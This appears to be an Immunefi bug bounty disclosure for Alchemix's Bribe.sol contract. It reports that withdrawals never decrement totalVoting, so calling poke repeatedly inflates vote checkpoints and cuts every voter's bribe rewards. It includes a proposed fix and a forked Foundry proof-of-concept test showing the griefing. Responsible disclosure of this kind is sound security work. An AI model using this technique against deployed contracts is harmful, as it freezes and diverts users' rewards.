# 31409 - \[SC - Critical] Users can grief Bribe rewards forcing them to b...

Submitted on May 18th 2024 at 15:43:37 UTC by @OxAlix2 for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31409

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

Impacts:

* Permanent freezing of unclaimed yield
* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro

When users vote in the `Voter` contract, it calls `Bribe::deposit` to "save" this vote, so that later when rewards come in for that Bribe can be distributed to users who voted. The opposite happens when users reset/withdraw their votes. However, there's 1 anomaly between the Bribe's deposit and withdrawal, where on deposit, Bribe is "checkpointing" the votes using:

```
totalVoting += amount;
_writeVotingCheckpoint()
```

And the opposite is not happening on the withdrawal, this allows users to mess up all the Bribe's rewards.

## Vulnerability Details

When users vote in the `Voter` contract, it calls `Bribe::deposit` which increases the total votes of that Bribe, however, on withdrawal these votes aren't being subtracted. On the other hand, the `Voter` contract allows users to continuously call the `poke` function that resets and then vote again in the same gauges/bribes, without any condition on that function. This allows voters to continuously call the `poke` function to skyrocket the total votes checkpoints in the Bribe, remember when `poke` resets/withdraws the votes they are not being removed.

These total votes' checkpoints are being used in `Bribe::earned`, to calculate the earned amount to each voter, it is being divided by, <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L261>, which wrongly decrease the rewards for each user.

## Impact Details

* Griefing of users, as their rewards will be a lot less than what they "deserve", if there were even some rewards left.
* The remaining unclaimed rewards will remain stuck forever in the contract.

## References

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol#L319-L329>

## Mitigation

Add the following in `Bribe::withdraw`:

```
totalVoting -= amount;
_writeVotingCheckpoint();
```

## Proof of concept

Fork block number used: `19877251`

```
function testGriefBribeRewards() public {
    // Bribe config
    uint256 usdcRewardAmount = 100e6;
    hevm.prank(voter.admin());
    voter.whitelist(usdc);
    address bribeAddress = voter.bribes(voter.gauges(alUsdPoolAddress));
    deal(address(usdc), address(this), usdcRewardAmount);
    IERC20(usdc).approve(bribeAddress, usdcRewardAmount);

    // Admin and Beef create locks
    uint256 tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, false);
    uint256 tokenId2 = createVeAlcx(beef, TOKEN_1, MAXTIME, false);

    address[] memory pools = new address[](1);
    pools[0] = alUsdPoolAddress;
    uint256[] memory weights = new uint256[](1);
    weights[0] = 5000;

    // Admin and Beef vote
    hevm.prank(admin);
    voter.vote(tokenId1, pools, weights, 0);
    hevm.prank(beef);
    voter.vote(tokenId2, pools, weights, 0);

    // Confirm voting success
    assertGt(IBribe(bribeAddress).totalVoting(), 0);

    // Increase time to reach just before epoch end
    hevm.warp(IBribe(bribeAddress).getEpochStart(block.timestamp) + 2 weeks - 1 hours);

    // Beef continously calls poke, messing up votes checkpoints in the Bribe contract
    hevm.startPrank(beef);
    voter.poke(tokenId2);
    hevm.warp(block.timestamp + 1);
    voter.poke(tokenId2);
    hevm.warp(block.timestamp + 1);
    voter.poke(tokenId2);
    hevm.warp(block.timestamp + 1);
    voter.poke(tokenId2);
    hevm.warp(block.timestamp + 1);
    voter.poke(tokenId2);
    hevm.stopPrank();

    // Rewards come in to the Bribe contract
    IBribe(bribeAddress).notifyRewardAmount(usdc, usdcRewardAmount);

    // Epoch ends
    hevm.warp(block.timestamp + 1 hours);

    // Voting still exists
    assertGt(IBribe(bribeAddress).totalVoting(), 0);
    // Rewards for each token is around 14 USDC where it should be 50 USDC (100 USDC / 2 tokens)
    assertEq(IBribe(bribeAddress).earned(usdc, tokenId1) / 1e6, 14);
    assertEq(IBribe(bribeAddress).earned(usdc, tokenId2) / 1e6, 14);
}
```
